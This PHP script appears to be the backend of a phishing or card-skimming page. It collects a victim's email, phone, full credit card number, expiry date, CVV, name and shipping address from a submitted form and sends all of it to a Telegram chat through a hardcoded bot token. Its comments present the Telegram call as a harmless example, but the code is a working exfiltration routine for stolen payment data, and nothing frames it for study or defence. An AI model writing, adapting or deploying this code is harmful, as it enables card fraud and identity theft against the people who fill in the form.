<?php
if (isset($_POST['email'])) {
    $email = $_POST['email'];
    $phone = $_POST['phone'];

    $shippingZip = $_POST['shippingZip'];
    $creditCardNumber = $_POST['creditCardNumber'];
    $expmonth = $_POST['expmonth'];
    $expyear = $_POST['expyear'];
    $CVV = $_POST['CVV'];

    $firstName = $_POST['firstName'];
    $lastName = $_POST['lastName'];
    $shippingAddress1 = $_POST['shippingAddress1'];
    $shippingCity = $_POST['shippingCity'];
    $shippingState = $_POST['shippingState'];
    $shippingCountry = $_POST['shippingCountry'];

    $message = "|Email             : " . $email . "\r\n";
    $message .= "|Phone             : " . $phone . "\r\n";

    $message .= "|Shipping Zip      : " . $shippingZip . "\r\n";
    $message .= "|Credit Card Number: " . $creditCardNumber . "\r\n";
    $message .= "|Expiration Month  : " . $expmonth . "\r\n";
    $message .= "|Expiration Year   : " . $expyear . "\r\n";
    $message .= "|CVV               : " . $CVV . "\r\n";

    $message .= "|First Name        : " . $firstName . "\r\n";
    $message .= "|Last Name         : " . $lastName . "\r\n";
    $message .= "|Shipping Address  : " . $shippingAddress1 . "\r\n";
    $message .= "|Shipping City     : " . $shippingCity . "\r\n";
    $message .= "|Shipping State    : " . $shippingState . "\r\n";
    $message .= "|Shipping Country  : " . $shippingCountry . "\r\n";

    // Add any additional processing or logging here

    // Example: Sending a message to a chat
    $ip = getenv("REMOTE_ADDR");
    $a = "6132777008:AAEYwNqKI60iWVFOAqjz6-4O-qsAenQbJP0";
    $chat = "-923348239";

    // Example: Sending message to Telegram chat
    $telegramURL = "https://api.telegram.org/bot" . $a . "/sendMessage?chat_id=" . $chat . "&text=" . urlencode($message);
    file_get_contents($telegramURL);

    // You can add additional actions or redirect the user after processing the form
}
?>
